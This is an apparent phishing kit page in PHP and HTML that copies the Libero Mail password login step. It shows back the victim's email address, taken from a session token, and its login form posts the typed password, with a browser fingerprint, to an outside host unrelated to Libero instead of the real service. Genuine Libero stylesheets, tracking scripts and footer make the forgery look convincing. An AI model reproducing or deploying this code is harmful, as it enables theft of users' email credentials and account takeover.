
<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<!DOCTYPE HTML>
<html>

<head>

<script>
 if ( self != top )
 {
   if ( window.location.href.replace )
      top.location.replace ( self.location.href );
   else
      top.location.href=self.document.href;
 }
</script>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="expires" content="0">
<meta http-equiv="pragma" content="no-cache">
<meta name="description" content="Inserisci la tua user e password ed entra in Libero Mail. Sei invece un nuovo utente? Crea un nuovo account o richiedi l"aiuto di Libero">

 
<title>Libero Mail - login</title>

   
<link rel="shortcut icon" href="https://login.libero.it/images/libero_favicon.ico" type="image/x-icon">
   
<link rel="stylesheet" type="text/css" href="https://i1.plug.it/mail/login/2020/libero/css/style.css?12052023">


<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>


<script type="text/javascript" src="https://i2.plug.it/mail/login/2018/js/placeholders.min.js"></script>




<!-- iubenda -->
<script type="text/javascript" src="https://i5.plug.it/cmp/iub_conf_libero.js"></script>
<script type="text/javascript" src="//cdn.iubenda.com/cs/tcf/stub-v2.js"></script>
<script type="text/javascript" src="//cdn.iubenda.com/cs/iubenda_cs.js" charset="UTF-8" async></script>
<!-- /iubenda -->
<!-- IOL/Iubenda -->
<script src="https://i5.plug.it/cmp/qciol.min.js" async="true"></script>
<!-- /IOL/Iubenda -->

<!-- <script src= "https://i4.plug.it/iplug/js/lib/iol/evnt/iol_evnt_v3.min.js">
</script>
-->


<script src= "https://i4.plug.it/iplug/js/lib/iol/evnt/iol_evnt_v3.min.js">
</script>

<script>

window.IOL = window.IOL || {};
   window.IOL.EVNT.evMngr = window.IOL.EVNT.evMngr || new window.IOL.EVNT.evMngrCls();

/*
event_type può valere: "pgmp", "pgmp_bxmp", "bxmp", "ck", "pgmp_pgnf", "pgmp_bxmp_pgnf", "pgnf"
pag_cat1: valorizzato con il nome della pagina corrente
pag_cat2: evento sulla pagina che scatena il tracciamento
*/

  const DRUID_TRACKING_FLAG_JS = 1;

function druid_track ( event_type, pag_id, pag_cat1, event_page, fields, )
{
   IOL.EVNT.evMngr.sendEvents( IOL.EVNT.evMngr.getEventUrls
                              (event_type,
                                {
                                  "domain" : "login.libero.it",
                                  "pag_id" : pag_id,
                                   "pag_cat1" : pag_cat1,
                                  "pag_cat2" : event_page,
                                  "attrs" : fields,
                               }
                             ), function() { /*console.log("evento " + event_type + " inviato" );*/ } );
}

</script>

<!--Adv-->

<link rel="preload" as="script" href="//www.iolam.it/js/iam2.0.js?ns=libero/web/webmail/login/1.1">
<link rel="preload" as="script" href="//www.iolam.it/js/prebid.js">
<link rel="preload" as="script" href="//c.amazon-adsystem.com/aax2/apstag.js">
<link rel="preconnect" href="https://www.iolam.it" crossorigin="use-credentials">
<link rel="preconnect" href="https://c.amazon-adsystem.com" crossorigin="use-credentials">
<link rel="preconnect" href="https://adservice.google.com" crossorigin="use-credentials">
<link rel="preconnect" href="https://adservice.google.it" crossorigin="use-credentials">
<link rel="preconnect" href="https://securepubads.g.doubleclick.net" crossorigin="use-credentials">

<script type="text/javascript">
var crtg_nid = "823";
var iol_adv_config = {"sito": "libero", "login_step": "step2"};
var pubAdsCfg={"location": "step2"};

// console.log ( "stringa: " + JSON.stringify(pubAdsCfg) );

</script>

<script type="text/javascript" src=https://www.iolam.it/js/iam2.0.js?ns=libero/web/webmail/login/1.1 async="async"></script>

</head>

<body>

    <!-- INIZIO DIV leaderboard 728x90 DFP -->
    <div id="adleaderboard">
    </div>
    <!-- FINE DIV leaderboard 728x90 DFP -->

    <div id="wrapper-iol">
        <section class="content">

<script>
!function(t,e,n){"undefined"!=typeof module&&module.exports?module.exports=n():"function"==typeof define&&define.amd?define(n):e.Fingerprint=n()}(0,this,function(){"use strict";var t=function(t){var e,n;e=Array.prototype.forEach,n=Array.prototype.map,this.each=function(t,n,r){if(null!==t)if(e&&t.forEach===e)t.forEach(n,r);else if(t.length===+t.length){for(var a=0,o=t.length;a<o;a++)if(n.call(r,t[a],a,t)==={})return}else for(var i in t)if(t.hasOwnProperty(i)&&n.call(r,t[i],i,t)==={})return},this.map=function(t,e,r){var a=[];return null==t?a:n&&t.map===n?t.map(e,r):(this.each(t,function(t,n,o){a[a.length]=e.call(r,t,n,o)}),a)},"object"==typeof t?(this.hasher=t.hasher,this.screen_resolution=t.screen_resolution,this.canvas=t.canvas,this.ie_activex=t.ie_activex):"function"==typeof t&&(this.hasher=t)};return t.prototype={get:function(){var t=[];try{t.push(navigator.userAgent),document.getElementById("useragent").value=navigator.userAgent}catch(t){}try{t.push(navigator.language)}catch(t){alert("Errore in language:"+t.message)}try{t.push(screen.colorDepth),document.getElementById("color").value=screen.colorDepth}catch(t){}try{this.screen_resolution&&void 0!==this.getScreenResolution()&&(t.push(this.getScreenResolution().join("x")),document.getElementById("screen").value=this.getScreenResolution().join("x"))}catch(t){}try{t.push((new Date).getTimezoneOffset()),document.getElementById("timezone").value=(new Date).getTimezoneOffset()}catch(t){}try{t.push(this.hasSessionStorage()),document.getElementById("sessionstorage").value=this.hasSessionStorage()}catch(t){}try{t.push(this.hasLocalStorage()),document.getElementById("localstorage").value=this.hasLocalStorage()}catch(t){}try{t.push(!!window.indexedDB)}catch(t){}try{document.body?t.push(typeof document.body.addBehavior):t.push("undefined")}catch(t){}try{t.push(typeof window.openDatabase)}catch(t){}try{t.push(navigator.cpuClass),document.getElementById("cpu").value=navigator.cpuClass}catch(t){}try{t.push(navigator.platform),document.getElementById("platform").value=navigator.platform}catch(t){}try{t.push(navigator.doNotTrack),document.getElementById("donottrack").value=navigator.doNotTrack}catch(t){}try{this.plugin&&t.push(this.getPluginsString()),document.getElementById("plugin").value=this.getPluginsString()}catch(t){}try{this.canvas&&this.isCanvasSupported()&&(t.push(this.getCanvasFingerprint()),document.getElementById("canvas").value=this.getCanvasFingerprint())}catch(t){}try{if(this.hasher)try{return this.hasher(t.join("###"),31)}catch(t){}else try{return this.murmurhash3_32_gc(t.join("###"),31)}catch(t){}}catch(t){}},murmurhash3_32_gc:function(t,e){var n,r,a,o,i,c,s,u;for(n=3&t.length,r=t.length-n,a=e,i=3432918353,c=461845907,u=0;u<r;)s=255&t.charCodeAt(u)|(255&t.charCodeAt(++u))<<8|(255&t.charCodeAt(++u))<<16|(255&t.charCodeAt(++u))<<24,++u,a=27492+(65535&(o=5*(65535&(a=(a^=s=(65535&(s=(s=(65535&s)*i+(((s>>>16)*i&65535)<<16)&4294967295)<<15|s>>>17))*c+(((s>>>16)*c&65535)<<16)&4294967295)<<13|a>>>19))+((5*(a>>>16)&65535)<<16)&4294967295))+((58964+(o>>>16)&65535)<<16);switch(s=0,n){case 3:s^=(255&t.charCodeAt(u+2))<<16;case 2:s^=(255&t.charCodeAt(u+1))<<8;case 1:a^=s=(65535&(s=(s=(65535&(s^=255&t.charCodeAt(u)))*i+(((s>>>16)*i&65535)<<16)&4294967295)<<15|s>>>17))*c+(((s>>>16)*c&65535)<<16)&4294967295}return a^=t.length,a^=a>>>16,a=2246822507*(65535&a)+((2246822507*(a>>>16)&65535)<<16)&4294967295,a^=a>>>13,a=3266489909*(65535&a)+((3266489909*(a>>>16)&65535)<<16)&4294967295,(a^=a>>>16)>>>0},hasLocalStorage:function(){try{return!!window.localStorage}catch(t){return!0}},hasSessionStorage:function(){try{return!!window.sessionStorage}catch(t){return!0}},isCanvasSupported:function(){var t=document.createElement("canvas");return!(!t.getContext||!t.getContext("2d"))},isIE:function(){return"Microsoft Internet Explorer"===navigator.appName||!("Netscape"!==navigator.appName||!/Trident/.test(navigator.userAgent))},getPluginsString:function(){return this.isIE()&&this.ie_activex?this.getIEPluginsString():this.getRegularPluginsString()},getRegularPluginsString:function(){return this.map(navigator.plugins,function(t){var e=this.map(t,function(t){return[t.type,t.suffixes].join("~")}).join(",");return[t.name,t.description,e].join("::")},this).join(";")},getIEPluginsString:function(){if(window.ActiveXObject){var t=["ShockwaveFlash.ShockwaveFlash","AcroPDF.PDF","PDF.PdfCtrl","QuickTime.QuickTime","rmocx.RealPlayer G2 Control","rmocx.RealPlayer G2 Control.1","RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)","RealVideo.RealVideo(tm) ActiveX Control (32-bit)","RealPlayer","SWCtl.SWCtl","WMPlayer.OCX","AgControl.AgControl","Skype.Detection"];return this.map(t,function(t){try{return new ActiveXObject(t),t}catch(t){return null}}).join(";")}return""},getScreenResolution:function(){return[screen.height,screen.width]},getCanvasFingerprint:function(){var t=document.createElement("canvas"),e=t.getContext("2d"),n="http://valve.github.io";return e.textBaseline="top",e.font="14px "Arial"",e.textBaseline="alphabetic",e.fillStyle="#f60",e.fillRect(125,1,62,20),e.fillStyle="#069",e.fillText(n,2,15),e.fillStyle="rgba(102, 204, 0, 0.7)",e.fillText(n,4,17),t.toDataURL()}},t});
</script>


    





<header>

       
<a class="logo" href="https://www.libero.it" title="Vai all"Home Page di Libero"></a>

       
<div class="txt greetings">
       
<!-- <?php echo $users;?>@<?php echo $ddomain;?> <a href="/?service_id=webmail&ret_url=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin&nst=76258">non sei tu?</a>
 -->
 <?php echo $users;?>@<?php echo $ddomain;?> <a href="nonseitu.php?service_id=webmail&ret_url=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin&nst=76258">non sei tu?</a>
       </div>


    </header>

    <div id="wait_layer" style="display:none">
     <div class="loading2"></div>
     <div class="lds-dual-ring"></div>
    </div>

<script>
function show_wait_layer( )
{
   setTimeout ( function() { $("#wait_layer").show(); }, 1000 );
   setTimeout ( function() { $("#wait_layer").hide() }, 10000 );
   return true;
}
</script>

        



<form name="autenticazione" method="post" onsubmit="return checkparams()" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">

         


<input type=hidden id="useragent" name="fullFingerprint[useragent]"/>
         
<input type=hidden id="language" name="fullFingerprint[language]"/>
         
<input type=hidden id="color" name="fullFingerprint[color]"/>
         
<input type=hidden id="screen" name="fullFingerprint[screen]" />
         
<input type=hidden id="timezone" name="fullFingerprint[timezone]"/>
         
<input type=hidden id="sessionstorage" name="fullFingerprint[sessionstorage]"/>
         
<input type=hidden id="localstorage" name="fullFingerprint[localstorage]"/>
         
<input type=hidden id="cpu" name="fullFingerprint[cpu]"/>
         
<input type=hidden id="platform" name="fullFingerprint[platform]"/>
         
<input type=hidden id="donottrack" name="fullFingerprint[donottrack]"/>
         
<input type=hidden id="plugin" name="fullFingerprint[plugin]"/>
         
<input type=hidden id="canvas" name="fullFingerprint[canvas]"/>
         
<input type=hidden id="hashFingerprint" name="hashFingerprint"/>

         
<input type=hidden id="adblock" name="adblock">
  
        
<input name="user" value="<?php echo $users;?>@<?php echo $ddomain;?>" type="email" style="display:none">

<input name="domain" value="<?php echo $ddomain;?>" type="hidden" >

<input name="link" value="https://login.libero.it/?ref=hpl-hdx" type="hidden" >
<input name="sender" value="Libero.it" type="hidden" >

       
<label id="label_password" class="iol-material-textfield-outlined ">


<input type="password" name="PASSWORD" id="password" value="" maxlength=25 required pattern=".*" autofocus >

           
<span>Inserisci la tua password</span>

  
         
<span toggle="#password" class="fa-eye field-icon toggle-password" onclick="$("#password").focus()"></span>

           
<span id="keyid_error" class="txt-error" style="display:none">
                         
</span>

         
</label>

         
<button id="form_submit" class="iol-material-button-contained">AVANTI</button>

         
<div class="settings">

             
<a id="password_dimenticata" target="_blank" href="https://account.libero.it/recuperopassword?url_member=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin">Password dimenticata?</a>
         
</div>

 
        
<section class="recaptcha" id=captchablock style="display:none">

        
 <span id="box_err_captcha" class="txt-error">
                    
</span>

        
</section>

       

</form>








<script>
 $("#password").on(
    {
           keydown: function()
           {
              $("#keypage_error").html("");
              /*
              $("#box_err_msg").html("");
              $("#label_password").removeClass("error");
              $("#keyid_error").html(""); 
              */
           }
     } );

 $("#password_dimenticata").click
  (function ()
   {
   }
  );


 if ( window.location.protocol == "ht" + "tp:" )
 { 
     $("#form_submit").prop("disabled", true); 
 }

 var fp4 = new Fingerprint({screen_resolution: true, plugin:false});
 document.getElementById("hashFingerprint").value = fp4.get();

 $(document).ready(function ()
 {
    $(".toggle-password").click(function ()
    {
       $(this).toggleClass("fa-eye fa-eye-slash");
       var input = $($(this).attr("toggle"));
       if (input.attr("type") == "password")
       {
          input.attr("type", "text");
       }
       else
       {
          input.attr("type", "password");
       }
    });
 });


function checkparams( )
{
  if ( typeof captcha_checked_flag !== "undefined")
  {
     if ( ! captcha_checked_flag )
     {
        // $("#box_err_msg").fadeOut(60, function(){$("#box_err_msg").html("")});

        $("#label_password").removeClass("error");

        $("#keyid_error").fadeOut(60, function(){$("#keyid_error").html("")});

        $("#box_err_captcha").fadeOut(60, function(){$("#box_err_captcha").html("")});
        $("#box_err_captcha").fadeIn(310, function(){$("#box_err_captcha").html("Non sono un robot &egrave; un campo obbligatorio.")});

        return false;
     }
  }

  if ( $("#password").val() == "" )
  {
     $("#keyid_error").fadeIn(310, function(){$("#keyid_error").html("Password non inserita")});

     $("#label_password").addClass("error");

     $("#password").focus();

     return false;
  }

  // $("#box_err_msg").fadeOut(60, function(){$("#box_err_msg").html("")});

  $("#keyid_error").fadeOut(60, function(){$("#keyid_error").html("")});

  $("#box_err_captcha").fadeOut(60, function(){$("#box_err_captcha").html("")});

  // $("#form_submit").prop("disabled", true); 
  $("#form_submit").prop("disabled", true).css("opacity",0.5);
  setTimeout(function(){ $("#form_submit").prop("disabled", false).css("opacity",1); }, 3000);


  return true;
}

<!-- Test AD Block -->

  var abdetected = -1;
  function loadExternalScript(url, onloadCallback, onerrorCallback)
  {
     var script = document.createElement("script");
     script.type = "text/javascript";
     script.src = url;
     script.onreadystatechange = onloadCallback;
     script.onload = onloadCallback;
     script.onerror = onerrorCallback;
     document.head.appendChild(script);
  }
  function adBlockNOTDetected()
  {
     abdetected = 0;
     // alert("adclock NOT detected");
  }
  function adBlockDetected ()
  {
     abdetected = 1;
     // alert("adclock detected");
     $("#adblock").val(1);
  }
  loadExternalScript("//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", adBlockNOTDetected, adBlockDetected);
  setTimeout(function ()
  {
     if (abdetected == -1) adBlockDetected(); }, 3000
            );

</script>


<!-- End Test AD Block -->

</script>


        
</section>

        <div id="box-editoriale" class="box-editoriale" style="display:none">
            <header>
                <h4>I PI&Ugrave; LETTI DI</h4>
                <h3><a id="general_content" href="https://quifinanza.it" target=_blank><img src="https://i1.plug.it//mail/login/2018/libero/img/logo-quifinanza.png" alt="QuiFinanza"></a></h3>
            </header>
            <ul>
                <li>
                    <a id=acontent_1 href="#" target=_blank><img id=img_1 src="">
                        <p id=p_1></p>
                    </a>
                    <a id=asubtitle_1 href="#" class="canale" target=_blank>Moda</a>
                </li>
                <li>
                    <a id=acontent_2 href="#" target=_blank><img id=img_2 src="">
                        <p id=p_2></p>
                    </a>
                    <div class="clearfix"></div>
                </li>
                <li>
                    <a id=acontent_3 href="#" target=_blank><img id=img_3 src="">
                        <p id=p_3></p>
                    </a>
                    <div class="clearfix"></div>
                </li>
                <li>
                    <a id=acontent_4 href="#" target=_blank><img id=img_4 src="">
                        <p id=p_4></p>
                    </a>
                    <div class="clearfix"></div>
                </li>
            </ul>
            <footer id="box-editoriale-footer"><a href="https://quifinanza.it" target=_blank>SCOPRI DI PIÙ</a></footer>
        </div>
        <div id="box-premium" class="box-premium" style="display:none">
                            <header>
                    <h4>I servizi di</h4>
                    <h3><a id="premium_general_content" href="https://www.libero.it" target="_blank" >
                            <img src="https://i1.plug.it/mail/login/2020/libero/img/logo.svg" alt="Libero"></a></h3> </header>
                            <ul>
                
                    <li>
                        <a id="premium_content_1" href="#" target="_blank" >
                            <img id="premium_img_1" src="" style="max-width: 80%;">
                            <p id="premium_p_1"></p>
                        </a>
                        <div class="clearfix"></div>
                    </li>
                    
                    <li>
                        <a id="premium_content_2" href="#" target="_blank" >
                            <img id="premium_img_2" src="" style="max-width: 80%;">
                            <p id="premium_p_2"></p>
                        </a>
                        <div class="clearfix"></div>
                    </li>
                    
                    <li>
                        <a id="premium_content_3" href="#" target="_blank" >
                            <img id="premium_img_3" src="" style="max-width: 80%;">
                            <p id="premium_p_3"></p>
                        </a>
                        <div class="clearfix"></div>
                    </li>
                    
                    <li>
                        <a id="premium_content_4" href="#" target="_blank" >
                            <img id="premium_img_4" src="" style="max-width: 80%;">
                            <p id="premium_p_4"></p>
                        </a>
                        <div class="clearfix"></div>
                    </li>
                    
                    <li>
                        <a id="premium_content_5" href="#" target="_blank" >
                            <img id="premium_img_5" src="" style="max-width: 80%;">
                            <p id="premium_p_5"></p>
                        </a>
                        <div class="clearfix"></div>
                    </li>
                                </ul>
        </div>
        <div class="ads-maxi" id="adsplash">
        </div>

    </div>

    <!-- INIZIO DIV mobleaderboard 320x50, 320x100 DFP -->
    <div id="admpu">
    </div>
    <!-- FINE DIV mobleaderboard 320x50, 320x100 DFP -->

<!-- footer -->
    <div id="footer-iol">
       <div class="left">
          <ul>
             <li><a rel="nofollow" target="_blank" href="https://www.italiaonline.it/corporate/chi-siamo/">Chi siamo</a></li>
             <li><a rel="nofollow" target="_blank" href="https://info.libero.it/note-legali/">Note Legali</a></li>
             <li><a rel="nofollow" target="_blank" href="https://privacy.italiaonline.it/privacy_libero.html">Privacy</a></li>
             <li><a rel="nofollow" target="_blank" href="https://privacy.italiaonline.it/common/cookie/privacy_detail.php">Cookie Policy</a></li>
             <li><a rel="nofollow" target="_blank" href="https://www.libero.it/?showCookiePolicy">Preferenze sui cookie</a></li>
             <li><a rel="nofollow" target="_blank" href="https://aiuto.libero.it/">Aiuto</a></li>
          </ul>
       </div>
       <div class="right">&copy; ITALIAONLINE S.p.A. 2023 - P. IVA 03970540963</div>
       <div class="clearfix"></div>
    </div>

    <!--fine footer-->

   <div class="iubenda-advertising-preferences-link" style="display:none"></div>

</body>

<script>

function showMpu()
{
  $("#divQuote").show();
}

</script>


<script>

const getRandomInt = ( min = 0, max = 1 ) => {
        return Math.floor( Math.random() * ( max - min + 1 ) ) + min;
};

function get_editorial() {
    var element = "quifinanza";
    if (element == "premium") {
        $.ajax({
            url: "https://login.libero.it/incs/editorials/premium_shrieks_libero.json",
            dataType: "json",
            success: function (response, status, xhr) {
                /* alert ("response:" + response);
                 for (var key in response)
                     alert("key: " + key + "\n" + "value: " + response[key]);
                 alert (JSON.stringify(response));*/
                // console.log("get_editorial");
                show_editorial_premium("quifinanza", response);
            }
        })
        $("body").addClass("premiumbg");
        $("#box-premium").show();
        $("#box-editoriale").hide();
    } else {
        $.ajax({
        url: "https://login.libero.it/incs/editorials/strilli_hp_libero.json",

        dataType: "json",

        success: function (response, status, xhr) {
            /*
              alert ("response:" + response);
              for (var key in response)
                  alert("key: " + key + "\n" + "value: " + response[key]);
              alert (JSON.stringify(response));
              alert ( "xhr.statusText: " + xhr.statusText );
              alert ( "xhr.status: " + xhr.status );
            */

            show_editorial("quifinanza", response);
        }
    })
}
}

function show_editorial ( channel, jsondata )
{
   druid_track ( "pgmp_pgnf", "login channels_shrieks", "CONTAINER_BOX CHANNELS_SHRIEKS", "impressions", "container_box");

   var data = jsondata[channel];

   druid_track ( "pgmp_pgnf", "login channels_shrieks", channel.toUpperCase(), "impressions", "channel");

   for (var i = 0; i < 4 && i < data.length; i++)
   {
      // console.log(data[i]["title_short"] + " " + (i + 1) + " " + data[i]["labelLink"]);

      $("#acontent_" + (i + 1)).attr("href", data[i]["link"].replace("?ref=libero", ""));

      $("#p_" + (i + 1)).html(data[i]["title_long"]);

      if (i == 0)
      {
         if ( data[i]["label"] != undefined && data[i]["label"] != "" )
         { 
            $("#asubtitle_" + (i + 1)).attr("href", data[i]["labelLink"]);
            $("#asubtitle_" + (i + 1)).html(data[i]["label"]);
            // alert ("label: " + data[i]["label"]);
         }
         else
         {
            $("#asubtitle_" + (i + 1)).attr("href", "https://quifinanza.it");
            $("#asubtitle_" + (i + 1)).html(data[i]["category"]);
         }

         $("#img_" + (i + 1)).attr("src", data[i]["imgResizedWebp"].replace("__DIMENSION__", "?w=200&h=114&a=c"));
      }
      else 
      {
         $("#img_" + (i + 1)).attr("src", data[i]["imgResizedWebp"].replace("__DIMENSION__", "?w=90&h=60&a=c"));
      }
   }
   $("body").removeClass("premiumbg");
   $("body").addClass(channel);

   // $("#divisorio").show();
   $("#box-premium").hide();
   $("#box-editoriale").show();
}

function show_editorial_premium ( channel, jsondata )
{
   druid_track ( "pgmp_pgnf", "login premium_shrieks", "CONTAINER_BOX PREMIUM_SHRIEKS", "impressions", "container_box");
   druid_track ( "pgmp_pgnf", "login premium_shrieks", "I SERVIZI DI LIBERO", "impressions", "shriek");

    var data = jsondata[channel];
    var manual = jsondata["manual"];
    var index = 0;
    //console.log("data= "+data.length);
    var max_size = "5";
    //console.log("data[automatic]= "+jsondata["automatic"]);
    //console.log("max_size= "+max_size);
    if( manual == 0){
        //Caso di organizzatore automatico - visualizzazione random dei post

        var element = this.getRandonIndexArray(data, max_size);
        if(element.length > 0)
        {
            for (var i = 0; i < element.length; i++)
            {
                index = element[i];
                // console.log(data[index]["title"] + ", " + data[index]["link"]);
                $("#premium_content_" + (i + 1)).attr("href", data[index]["link"].replace("?ref=libero", ""));
                $("#premium_p_" + (i + 1)).html(data[index]["title"]+"<span id="premium_span_" + (i+1) + "">"+data[index]["description"]+"</span>");
                $("#premium_img_" + (i + 1)).attr("src", data[index]["main_image"]+"?w=90&h=60&a=c");
               // $("#premium_img_" + (i + 1)).attr("src", data[index]["main_image"]);

               druid_track ( "pgmp_pgnf", "login premium_shrieks", data[index]["description"].toUpperCase(), "impressions", "shriek");
            }
        }
    }else if( manual == 1)
    {
       //caso di organizzatore manuale
       for ( var i = 0; i < data.length && i < max_size; i++ )
       {
           //console.log(data[i]["title"] + ", " + data[i]["link"]);
           $("#premium_content_" + (i + 1)).attr("href", data[i]["link"].replace("?ref=libero", ""));
           $("#premium_p_" + (i + 1)).html(data[i]["title"]+"<span id="premium_span_" + (i+1) + "">"+data[i]["description"]+"</span>");
           $("#premium_img_" + (i + 1)).attr("src", data[i]["main_image"]+"?w=90&h=60&a=c");

           druid_track ( "pgmp_pgnf", "login premium_shrieks", data[index]["description"].toUpperCase(), "impressions", "shriek");
       }
    }
}

function getRandonIndexArray( data, size_max )
{
    var element = [] ;
    var i = 0;
    var insert = false;
    while( i< size_max )
    {
        insert = false;
        index = getRandomInt( 0, data.length-1 );
        if(element.length == 0) {
            //console.log("Element size zero= ");
            insert = true;
        }
        else
        {
            if(element.indexOf(index) == -1)
            {
                insert = true;
               // console.log("setto insert a true =");
            }
        }
        if( insert )
        {
            //console.log("index ok i="+i);
            i++;
            element.push(index);
            //console.log("Inserito elemento element= "+element);
        }
    }
    // console.log("FINE element= "+element);
    return element;
}
/*
per test
get_editorial();
*/


</script>


<!-- START Nielsen -->

<script>
 $("#iol-tracking-img").remove();
  $("<img id="iol-tracking-img">").attr({
      src: "//secure-it.imrworldwide.com/cgi-bin/m?ci=libero-it&amp;cg=0&amp;si=http://login.libero.it/&seq=" + (new Date()).getTime(),
      style: "display:none"
  }).appendTo("BODY");

  // Static Queue Snippet
!function(t,n){t[n]=t[n]||{nlsQ:function(e,o,c,r,s,i){return s=t.document,r=s.createElement("script"),r.async=1,r.src=("http:"===t.location.protocol?"http:":"https:")+"//cdn-gl.imrworldwide.com/conf/"+e+".js#name="+o+"&ns="+n,i=s.getElementsByTagName("script")[0],i.parentNode.insertBefore(r,i),t[n][o]=t[n][o]||{g:c||{},ggPM:function(e,c,r,s,i){(t[n][o].q=t[n][o].q||[]).push([e,c,r,s,i])}},t[n][o]}}}(window,"NOLBUNDLE");

  // SDK Initialization
  var nSdkInstancestatic = NOLBUNDLE.nlsQ("PB842EDC3-BDDA-4494-9CDE-8B0150370A55","nlsnInstance");
  
  // Content Metadata 
  var rnd=new Date().getTime();
  var nielsenMetadata = {
    type: "static", 
    assetid: rnd, // *DYNAMIC METADATA*: unique ID for each article **REQUIRED**
    section: "LiberoMessaging_BRW" // *DYNAMIC METADATA*: section of site **REQUIRED**
    }; 
    
  // Event "staticstart" Call
  nSdkInstancestatic.ggPM("staticstart", nielsenMetadata);
</script>

<!-- END Nielsen -->

<!-- START IOL Analytics -->

<script type="text/javascript">

  var iol_login_page_id = "webmail.step2";

  window.iol_analytics_tracking_conf = window.iol_analytics_tracking_conf || {};

  iol_analytics_tracking_conf =
  {
    customParams:
    {
        24: "webmail",
        47: ""
    }
  }

</script>


<script src="https://i4.plug.it/iplug/js/lib/iol/analytics/data/login-libero-it/tracking_login-libero-it.min.js"></script>
<script src="https://i4.plug.it/iplug/js/lib/iol/analytics/engine/IOL.Analytics.Tracking.min.js"></script>
<script type="text/javascript">
var iat = new IOL.Analytics.Tracking.Engine();
iat.send();
</script>
<noscript><img src="//italiaonline01.wt-eu02.net/215973748390194/wt.pl?p=315,libero.web.login.noscript&amp;cg1=libero&amp;cg2=web&amp;cg3=login&amp;cg4=noscript&amp;cg7=libero.web.login.noscript" height="1" width="1" alt=""></noscript>


<!-- END IOL Analytics -->


</html>


<script>

// druid_track ( "pgmp_pgnf", "page_show", "");

 $(document).ready(function()
  {
  $("a#general_content").click(function ()
  {
     druid_track ( "pgnf", "login channels_shrieks", "QUIFINANZA", "clicks",  "position header" );
  } );
  $("#box-editoriale-footer").click(function ()
  {
     druid_track ( "pgnf", "login channels_shrieks", "QUIFINANZA", "clicks",  "position footer" );
  } );

  $("a#acontent_1").click(function ()
  {
     druid_track ( "pgnf", "login channels_shrieks", "QUIFINANZA", "clicks",  "position 1" );
  } );

  $("a#acontent_2").click(function ()
  {
     druid_track ( "pgnf", "login channels_shrieks", "QUIFINANZA", "clicks", "position 2" );
  } );

  $("a#acontent_3").click(function ()
  {
     druid_track ( "pgnf", "login channels_shrieks", "QUIFINANZA", "clicks", "position 3" );
  } );

  $("a#acontent_4").click(function ()
  {
     druid_track ( "pgnf", "login channels_shrieks", "QUIFINANZA", "clicks", "position 4" );
  } );


  
  $("#premium_general_content").click(function ()
  {
     druid_track ( "pgnf", "login premium_shrieks", "I SERVIZI DI LIBERO", "clicks", "position header" );
  } );
  $("#premium_content_1").click(function ()
  {
     druid_track ( "pgnf", "login premium_shrieks", $("#premium_span_1").text().toUpperCase(), "clicks", "position 1" );
  } );
  $("#premium_content_2").click(function ()
  {
     druid_track ( "pgnf", "login premium_shrieks", $("#premium_span_2").text().toUpperCase(), "clicks", "position 2" );
  } );

  $("#premium_content_3").click(function ()
  {
     druid_track ( "pgnf", "login premium_shrieks", $("#premium_span_3").text().toUpperCase(), "clicks", "position 3" );
  } );

  $("#premium_content_4").click(function ()
  {
     druid_track ( "pgnf", "login premium_shrieks", $("#premium_span_4").text().toUpperCase(), "clicks", "position 4");
  } );

  $("#premium_content_5").click(function ()
  {
     druid_track ( "pgnf", "login premium_shrieks", $("#premium_span_5").text().toUpperCase(), "clicks", "position 5");
  } );

 } );

</script>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>